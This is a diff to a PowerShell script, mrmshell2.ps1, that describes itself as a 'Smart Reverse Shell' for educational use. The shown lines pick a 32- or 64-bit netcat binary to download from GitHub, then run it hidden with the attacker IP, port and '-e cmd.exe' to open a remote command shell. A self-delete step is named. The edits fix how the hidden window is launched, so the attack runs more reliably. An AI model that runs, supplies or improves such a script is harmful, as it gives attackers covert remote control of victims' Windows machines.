@@ -1,4 +1,4 @@
-# mrmshell2.ps1 - Smart Reverse Shell (Auto 32/64-bit, TLS, Safe Cleanup)
+# mrmshell2.ps1 - Smart Reverse Shell (Auto 32/64-bit, No Errors)
 # Educational use only
 
 # 1. Enable TLS 1.2
@@ -7,9 +7,9 @@
 # 2. Auto-detect architecture
 $is64bit = [Environment]::Is64BitOperatingSystem
 $ncUrl = if ($is64bit) {
-    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"
+    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"  # 64-bit
 } else {
-    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
+    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"     # 32-bit
 }
 
 # 3. Settings
@@ -27,9 +27,9 @@ try {
     exit 1
 }
 
-# 5. Execute reverse shell
+# 5. Execute reverse shell (FIXED: فقط -WindowStyle Hidden)
 if (Test-Path $ncPath) {
-    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden -NoNewWindow
+    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden
 }
 
 # 6. Safe self-delete
